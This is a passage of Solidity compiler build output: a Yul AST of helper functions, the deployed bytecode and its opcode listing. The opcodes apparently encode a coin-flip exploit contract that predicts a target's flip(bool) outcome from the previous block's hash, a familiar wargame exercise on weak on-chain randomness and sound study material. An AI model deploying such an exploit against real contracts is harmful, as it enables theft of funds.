														"name": "end",
														"nodeType": "YulTypedName",
														"src": "53:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "61:5:2",
														"type": ""
													}
												],
												"src": "7:137:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:204:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "270:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "279:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "282:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "272:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "272:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "272:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "245:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "254:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "241:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "241:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "266:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "237:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "237:32:2"
															},
															"nodeType": "YulIf",
															"src": "234:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "296:125:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "311:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "325:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "315:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "340:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "383:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "394:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "379:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "379:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "403:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "350:28:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "350:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "340:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "194:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "205:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "217:6:2",
														"type": ""
													}
												],
												"src": "150:278:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "493:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "510:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "530:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "515:14:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "515:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "503:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "503:34:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "503:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "481:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "488:3:2",
														"type": ""
													}
												],
												"src": "434:109:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "641:118:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "651:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "663:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "674:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "659:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "659:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "651:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "725:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "738:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "749:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "734:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "734:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "687:37:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "687:65:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "687:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "613:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "625:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "636:4:2",
														"type": ""
													}
												],
												"src": "549:210:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "807:143:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "817:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "840:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "822:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "822:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "817:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "851:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "874:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "856:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "856:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "851:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "898:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "900:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "900:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "900:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "895:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "888:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "888:9:2"
															},
															"nodeType": "YulIf",
															"src": "885:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "930:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "939:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "942:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "930:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "796:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "799:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "805:1:2",
														"type": ""
													}
												],
												"src": "765:185:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1001:146:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1011:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1034:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1016:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1016:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1011:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1045:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1068:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1050:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1050:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1045:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1092:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1094:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1094:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1094:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1086:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1089:1:2"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1083:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1083:8:2"
															},
															"nodeType": "YulIf",
															"src": "1080:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1124:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1136:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1139:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1132:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1132:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1124:4:2"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "987:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "990:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "996:4:2",
														"type": ""
													}
												],
												"src": "956:191:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1195:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1205:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1230:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1223:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1223:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1216:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1216:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1205:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1177:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1187:7:2",
														"type": ""
													}
												],
												"src": "1153:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1294:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1304:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1315:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1304:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1276:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1286:7:2",
														"type": ""
													}
												],
												"src": "1249:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1360:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1377:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1380:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1370:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1370:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1370:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1474:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1477:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1467:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1467:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1467:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1498:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1501:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1491:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1491:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1491:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1332:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1546:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1563:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1566:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1556:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1556:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1556:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1660:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1663:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1653:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1653:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1653:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1684:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1687:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1677:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1677:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1677:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "1518:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1744:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1798:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1807:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1810:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1800:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1800:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1800:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1767:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1789:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "1774:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1774:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1764:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1764:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1757:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1757:40:2"
															},
															"nodeType": "YulIf",
															"src": "1754:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1737:5:2",
														"type": ""
													}
												],
												"src": "1704:116:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063aa1b510e14610030575b600080fd5b61003861004e565b6040516100459190610193565b60405180910390f35b60008060014361005e91906101df565b4060001c9050600080548261007391906101ae565b9050600060018214610086576000610089565b60015b90506000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16631d263f67836040518263ffffffff1660e01b81526004016100eb9190610193565b602060405180830381600087803b15801561010557600080fd5b505af1158015610119573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013d919061015b565b94505050505090565b60008151905061015581610287565b92915050565b60006020828403121561016d57600080fd5b600061017b84828501610146565b91505092915050565b61018d81610213565b82525050565b60006020820190506101a86000830184610184565b92915050565b60006101b98261021f565b91506101c48361021f565b9250826101d4576101d3610258565b5b828204905092915050565b60006101ea8261021f565b91506101f58361021f565b92508282101561020857610207610229565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61029081610213565b811461029b57600080fd5b5056fea2646970667358221220485b08a8942e4502a62214723952777fffeab66b4d9e3bda8901994ed7182fd564736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAA1B510E EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x5E SWAP2 SWAP1 PUSH2 0x1DF JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 DUP1 SLOAD DUP3 PUSH2 0x73 SWAP2 SWAP1 PUSH2 0x1AE JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x86 JUMPI PUSH1 0x0 PUSH2 0x89 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEB SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x15B JUMP JUMPDEST SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x155 DUP2 PUSH2 0x287 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x17B DUP5 DUP3 DUP6 ADD PUSH2 0x146 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x18D DUP2 PUSH2 0x213 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1A8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x184 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B9 DUP3 PUSH2 0x21F JUMP JUMPDEST SWAP2 POP PUSH2 0x1C4 DUP4 PUSH2 0x21F JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1D4 JUMPI PUSH2 0x1D3 PUSH2 0x258 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1EA DUP3 PUSH2 0x21F JUMP JUMPDEST SWAP2 POP PUSH2 0x1F5 DUP4 PUSH2 0x21F JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x208 JUMPI PUSH2 0x207 PUSH2 0x229 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x290 DUP2 PUSH2 0x213 JUMP JUMPDEST DUP2 EQ PUSH2 0x29B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x48 JUMPDEST ADDMOD 0xA8 SWAP5 0x2E GASLIMIT MUL 0xA6 0x22 EQ PUSH19 0x3952777FFFEAB66B4D9E3BDA8901994ED7182F 0xD5 PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER ",
